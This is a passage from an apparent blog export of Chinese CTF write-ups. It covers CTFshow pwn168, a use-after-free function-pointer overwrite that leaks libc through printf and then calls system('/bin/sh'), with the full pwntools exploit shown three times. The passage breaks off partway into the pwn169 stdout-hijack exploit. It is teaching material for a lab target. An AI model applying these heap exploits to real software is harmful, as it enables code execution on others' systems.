思路分析\n1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。\n2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为\"/bin/sh;\"就可以打通。但再此之前我们要泄露出libc。\n3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。\n4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。\n5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。\n6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用\"/bin/sh\\x00\"，因为会0字符截断，导致后续的system地址写不上去。\n## exp\n```python \nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\n\n# libc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6\")\n\ndef create(size,content):\n    io.recvuntil(\"3.quit\\n\")\n    io.send(\"create \")\n    io.sendlineafter(\"Pls give string size:\",str(size))\n    io.sendafter(\"str:\",content)\n\ndef delete(idx):\n    io.recvuntil(\"3.quit\\n\")\n    io.send(\"delete \")\n    io.sendlineafter(\"id:\",str(idx))\n    io.sendlineafter(\"Are you sure?:\",\"yes\")\n\ndef exploit():\n    create(0x10,b'\\x61'*0x10) # 0 \n    create(0x10,b'\\x62'*0x10) # 1\n    delete(1) \n    delete(0)\n\n    create(0x20,b'%22$p'.ljust(0x18,b'b') + p16(0x08C0)) # 0 1是content\n\n    delete(1)\n    stdout=int(io.recv(14),16)\n    libc=LibcSearcher(\"_IO_2_1_stdout_\",stdout)\n    libcbase=stdout-libc.dump(\"_IO_2_1_stdout_\")\n    system=libcbase+libc.dump(\"system\")\n    # libcbase=stdout-libc.sym[\"_IO_2_1_stdout_\"]\n    # system=libcbase+libc.sym[\"system\"]\n    logvalue(\"system\",hex(system))\n    logvalue(\"libc\",hex(libcbase))\n\n    create(0x10,b'\\x61'*0x9+b'\\x00')   # 1\n    create(0x10,b'\\x62'*0x9+b'\\x00')   # 2\n    delete(2)  \n    delete(1)\n    create(0x20,b'/bin/sh;'.ljust(0x18,b'\\x63') + p64(system)) # 1 2是content\n    #gdb.attach(io)\n    delete(2)\n\ni=0\nwhile True:\n    try:\n        io,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28247)\n        exploit()\n        io.interactive()\n    except:\n        io.close()\n        print(i)\n        i+=1\n    \n```","slug":"heap/CTFshow pwn168","published":1,"date":"2025-06-22T12:08:58.259Z","updated":"2025-06-23T05:48:09.518Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2id001kuomyfk0q671w","content":"<h1 id=\"CTFshow-pwn168-UAF-重叠\"><a href=\"#CTFshow-pwn168-UAF-重叠\" class=\"headerlink\" title=\"CTFshow pwn168(UAF|重叠)\"></a>CTFshow pwn168(UAF|重叠)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。<br>​\t可谓是<strong>“狸猫换太子”+“借尸还魂”</strong></p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"creat函数分析\"><a href=\"#creat函数分析\" class=\"headerlink\" title=\"creat函数分析\"></a>creat函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png\" alt=\"image-20250610224944662\"><br>1.首先会自动申请一个0x20的堆块，设为ptr1<br>2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存<br>3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数<br>4.ptr1+4 存放这数据长度<br>5.同时在bss段上的heaplist存放ptr1。<br>6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先”\\x00”截断的情况。</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png\" alt=\"image-20250610225808351\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png\" alt=\"image-20250610230022127\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png\" alt=\"image-20250610230034623\"></p>\n<p>1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数<br>2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。<br>2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为”&#x2F;bin&#x2F;sh;”就可以打通。但再此之前我们要泄露出libc。<br>3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。<br>4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。<br>5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。<br>6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用”&#x2F;bin&#x2F;sh\\x00”，因为会0字符截断，导致后续的system地址写不上去。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;3.quit\\n&quot;</span>)</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;create &quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Pls give string size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;str:&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;3.quit\\n&quot;</span>)</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;delete &quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;id:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Are you sure?:&quot;</span>,<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">    delete(<span class=\"number\">1</span>) </span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    create(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;%22$p&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;b&#x27;</span>) + p16(<span class=\"number\">0x08C0</span>)) <span class=\"comment\"># 0 1是content</span></span><br><span class=\"line\"></span><br><span class=\"line\">    delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">    stdout=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">    libc=LibcSearcher(<span class=\"string\">&quot;_IO_2_1_stdout_&quot;</span>,stdout)</span><br><span class=\"line\">    libcbase=stdout-libc.dump(<span class=\"string\">&quot;_IO_2_1_stdout_&quot;</span>)</span><br><span class=\"line\">    system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># libcbase=stdout-libc.sym[&quot;_IO_2_1_stdout_&quot;]</span></span><br><span class=\"line\">    <span class=\"comment\"># system=libcbase+libc.sym[&quot;system&quot;]</span></span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;libc&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">0x9</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>)   <span class=\"comment\"># 1</span></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">0x9</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>)   <span class=\"comment\"># 2</span></span><br><span class=\"line\">    delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">    delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">    create(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;\\x63&#x27;</span>) + p64(system)) <span class=\"comment\"># 1 2是content</span></span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">    delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28247</span>)</span><br><span class=\"line\">        exploit()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        i+=<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn168-UAF-重叠\"><a href=\"#CTFshow-pwn168-UAF-重叠\" class=\"headerlink\" title=\"CTFshow pwn168(UAF|重叠)\"></a>CTFshow pwn168(UAF|重叠)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。<br>​\t可谓是<strong>“狸猫换太子”+“借尸还魂”</strong></p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"creat函数分析\"><a href=\"#creat函数分析\" class=\"headerlink\" title=\"creat函数分析\"></a>creat函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png\" alt=\"image-20250610224944662\"><br>1.首先会自动申请一个0x20的堆块，设为ptr1<br>2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存<br>3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数<br>4.ptr1+4 存放这数据长度<br>5.同时在bss段上的heaplist存放ptr1。<br>6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先”\\x00”截断的情况。</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png\" alt=\"image-20250610225808351\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png\" alt=\"image-20250610230022127\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png\" alt=\"image-20250610230034623\"></p>\n<p>1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数<br>2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。<br>2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为”&#x2F;bin&#x2F;sh;”就可以打通。但再此之前我们要泄露出libc。<br>3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。<br>4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。<br>5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。<br>6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用”&#x2F;bin&#x2F;sh\\x00”，因为会0字符截断，导致后续的system地址写不上去。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;3.quit\\n&quot;</span>)</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;create &quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Pls give string size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;str:&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;3.quit\\n&quot;</span>)</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;delete &quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;id:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Are you sure?:&quot;</span>,<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">    delete(<span class=\"number\">1</span>) </span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    create(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;%22$p&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;b&#x27;</span>) + p16(<span class=\"number\">0x08C0</span>)) <span class=\"comment\"># 0 1是content</span></span><br><span class=\"line\"></span><br><span class=\"line\">    delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">    stdout=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">    libc=LibcSearcher(<span class=\"string\">&quot;_IO_2_1_stdout_&quot;</span>,stdout)</span><br><span class=\"line\">    libcbase=stdout-libc.dump(<span class=\"string\">&quot;_IO_2_1_stdout_&quot;</span>)</span><br><span class=\"line\">    system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># libcbase=stdout-libc.sym[&quot;_IO_2_1_stdout_&quot;]</span></span><br><span class=\"line\">    <span class=\"comment\"># system=libcbase+libc.sym[&quot;system&quot;]</span></span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;libc&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">0x9</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>)   <span class=\"comment\"># 1</span></span><br><span class=\"line\">    create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">0x9</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>)   <span class=\"comment\"># 2</span></span><br><span class=\"line\">    delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">    delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">    create(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;\\x63&#x27;</span>) + p64(system)) <span class=\"comment\"># 1 2是content</span></span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">    delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28247</span>)</span><br><span class=\"line\">        exploit()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        i+=<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>"},{"title":"CTFshow pwn169","cover":"/img/治不开心药.png","_content":"# CTFshow pwn169(重叠|劫持stdout)\n## 前言\n\n​\t堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。\n​\t如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是**“瞒天过海”**\n\n## ida分析\n### main函数分析\n![image-20250611230847917](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png)\n1.一个menu，三个功能\n2.没有show，应该是需要劫持stdout来泄露libc的\n\n### create函数分析\n![image-20250611230931371](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png)\n1.限制了大小，大小合适才能malloc\n2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin\n\n### delete函数分析\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png)\n1.明显的uaf漏洞\n\n### rename函数分析\n![image-20250611231354251](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png)\n1.没有漏洞只能正常的编辑堆块内容\n\n## 思路分析\n1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？\n2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。\n3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。\n\n\n## exp\n```python \nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\n\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6\")\n\ndef add(size,idx,content):\n    io.sendlineafter(\"choice >>\",\"1\")\n    io.sendlineafter(\"wlecome input your size of skills: \",str(size))\n    io.sendlineafter(\"input index: \",str(idx))\n    io.sendafter(\"input your name:\\n\",content)\n\ndef free(idx):\n    io.sendlineafter(\"choice >>\",\"2\")\n    io.sendlineafter(\"input idx :\",str(idx))\n\ndef edit(idx,content):\n    io.sendlineafter(\"choice >>\",\"3\")\n    io.sendlineafter(\"input idx: \",str(idx))\n    io.sendafter(\"new content:\",content)\n\n\ndef exploit():\n    fake=p64(0)+p64(0x71)\n    add(0x60,0,b'\\x63'*0x10+fake) # 0\n    add(0x60,1,b'\\x61'*4) # 1 .....\n    add(0x10,2,b'\\x62'*4) # 2\n    add(0x60,3,b'\\x64'*4) # 3\n    add(0x20,4,b'\\x64'*4) # 4\n    free(1)\n    free(0)\n\n    edit(0,b'\\x20')\n    add(0x60,0,b'a')   # 0\n   